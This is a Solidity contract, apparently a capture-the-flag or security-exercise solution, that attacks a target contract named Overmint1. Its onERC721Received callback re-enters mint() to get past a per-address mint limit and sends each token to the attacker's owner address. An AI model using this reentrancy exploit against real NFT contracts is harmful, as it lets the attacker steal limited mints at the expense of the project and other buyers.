// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../Overmint1.sol";

contract Overmint1Attacker is IERC721Receiver {
    Overmint1 public immutable target;
    address internal immutable owner;

    constructor(address _target, address _owner) {
        target = Overmint1(_target);
        owner = _owner;
    }

    function attack() external {
        target.mint();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes memory data
    ) public virtual override returns (bytes4) {
        if (target.balanceOf(address(this)) < 5) {
            target.mint();
        }
        target.safeTransferFrom(address(this), owner, tokenId);
        return IERC721Receiver.onERC721Received.selector;
    }
}
